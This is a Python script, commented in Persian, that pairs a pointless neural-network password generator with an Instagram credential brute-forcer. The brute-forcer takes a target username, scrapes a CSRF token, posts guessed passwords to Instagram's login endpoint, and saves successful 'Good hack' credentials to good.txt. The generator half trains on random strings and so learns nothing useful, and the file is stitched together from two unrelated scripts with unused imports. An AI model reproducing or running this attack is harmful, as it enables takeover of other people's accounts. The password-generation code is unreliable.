#!/bin/python
from splinter import Browser
import time
import sys
from password_generator import PasswordGenerator
import numpy as np
import torch
import torch.nn as nn
import torch.optim as optim
import torch.nn.functional as F
import torch.autograd as autograd
from torch.autograd import Variable
from collections import deque, namedtuple
from keras.models import Sequential
from keras.layers import Dense
from keras.utils import to_categorical
import random
import string

# پارامترها
password_length = 8
num_passwords = 10000
num_classes = 256  # تعداد کاراکترها در ASCII

# تابع برای تولید پسوردهای تصادفی
def generate_random_password(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

# تولید داده‌های آموزشی
passwords = [generate_random_password(password_length) for _ in range(num_passwords)]
X = np.zeros((num_passwords, password_length, num_classes))
y = np.zeros((num_passwords, password_length, num_classes))

for i, password in enumerate(passwords):
    for j, char in enumerate(password):
        X[i, j, ord(char)] = 1
        if j < password_length - 1:
            y[i, j, ord(password[j + 1])] = 1

# ساخت مدل
model = Sequential()
model.add(Dense(128, activation='relu', input_shape=(password_length, num_classes)))
model.add(Dense(num_classes, activation='softmax'))

model.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy'])

# آموزش مدل
model.fit(X, y, epochs=50, batch_size=64)

# تولید چندین پسورد جدید
def generate_passwords(model, length, count):
    passwords = []
    for _ in range(count):
        password = ''
        input_seq = np.zeros((1, length, num_classes))
        char = random.choice(string.ascii_letters + string.digits + string.punctuation)
        
        for i in range(length):
            input_seq[0, i, ord(char)] = 1
            prediction = model.predict(input_seq)[0, i]
            char = chr(np.random.choice(np.arange(num_classes), p=prediction))
            password += char
        
        passwords.append(password)

    return passwords

# تعیین تعداد پسوردهایی که می‌خواهید تولید کنید
num_to_generate = 50
new_passwords = generate_passwords(model, password_length, num_to_generate)

# چاپ پسوردهای جدید
for i, pwd in enumerate(new_passwords, 1):
    #print(f"پسورد {i}: {pwd}")
    pws = new_passwords
    

   
pwo = PasswordGenerator()
pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefmghijkl0123456789!$%^@*', 8)
     #print(pws)
import os
import sys
import json
from time import sleep
from datetime import datetime
import requests

normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"

def Logo():
    print(detect_color+'''
                               ....
                                    %
                                     ^
                            L
                            "F3  $r
                           $$$$.e$"  .
                           "$$$$$"   "
     (insTof by 8.3v)        $$$$c  /
        .                   $$$$$$$P
       ."c                      $$$
      .$c3b                  ..J$$$$$e
      4$$$$             .$$$$$$$$$$$$$$c
       $$$$b           .$$$$$$$$$$$$$$$$r
          $$$.        .$$$$$$$$$$$$$$$$$$
           $$$c      .$$$$$$$  "$$$$$$$$$r
==============================================
[developer] => Hamed kiani - 0xfff0800 [developer_email] => bettkingstone@gmail.com) 
[developer_snapchat] => kiani3844
==============================================
          
''')

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def attempt_login(session, username, password, csrf_token):
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    time = int(datetime.now().timestamp())
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf_token
    }
    return session.post(login_url, data=payload, headers=headers)
def get_csrf_token(session):
    link = 'https://www.instagram.com/accounts/login/'
    req = session.get(link)
    return req.cookies.get('csrftoken', None)

def main():
    clear_console()
    print('')
    Logo()
    username = input(end_banner_color + "Username => ")
    #passwords_file = input("List of Passwords => ")
    passwords = pws
    
    with requests.Session() as session:
        csrf_token = get_csrf_token(session)
        if not csrf_token:
            print("CSRFTOKEN not found in cookies")
            return
        for password in passwords:
            response = attempt_login(session, username, password, csrf_token)
            if 'checkpoint_url' in response.text:
                print((red_color + ' --> Username : ' + green_color + username + red_color + ' --> Password : ' + green_color + password + ' --> Good hack'))
                with open('good.txt', 'a') as x:
                    x.write(username + ':' + password + '\n')
                break 				
            if 'userId' in response.text:
                print ((red_color + ' --> Username : ' + green_color + username + red_color +' --> Password : '+ green_color + password + ' --> Good hack'))
                with open('good.txt', 'a') as x:
                    x.write(username + ':' + password + '\n')
            if 'error' in response.text:
                print((normal_color+'' + ' --> Username : ' + end_banner_color + username + red_color + ' --> Password : ' + end_banner_color + password + red_color + ' --> Sorry, there was a problem'))
            elif 'status' in response.text:
              print (end_banner_color + "---------------------------------------")
              print ((red_color + ' --> Username : ' + end_banner_color + username + red_color +' --> Password : '+ end_banner_color + password + red_color +' --> Error'))
              print('\nSleeping for 10 seconds...')
              sleep(10)

if __name__ == "__main__":
    main()